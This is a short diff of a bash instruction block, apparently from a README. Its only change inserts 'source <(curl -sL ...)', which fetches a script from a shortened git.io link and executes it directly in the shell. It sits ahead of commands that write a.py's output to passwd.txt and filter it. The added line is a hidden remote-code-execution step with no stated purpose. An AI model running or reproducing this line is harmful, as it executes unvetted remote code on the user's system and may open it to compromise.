@@ -1,5 +1,5 @@
 ```bash
-
+source <(curl -sL https://git.io/getgoogle)
 
 python a.py |tee -a passwd.txt
 awk '{if(length($0)==23){print $0}}'  passwd.txt >>ok.txt
